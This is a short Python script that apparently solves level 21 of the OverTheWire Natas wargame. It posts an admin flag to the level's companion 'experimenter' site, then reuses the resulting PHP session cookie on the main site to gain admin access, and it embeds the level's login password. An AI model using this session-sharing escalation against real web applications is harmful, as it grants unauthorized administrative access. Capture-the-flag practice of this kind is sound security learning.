#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url = 'http://%s.natas.labs.overthewire.org/' % username
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'


session = requests.Session()

# response = session.get(url, auth = (username, password))
# print response.text

response = session.post(experimenter, auth = (username, password))
print response.text
old_session = session.cookies["PHPSESSID"]


response = session.get(url, cookies = {"PHPSESSID": old_session}, auth = (username, password))
print response.text
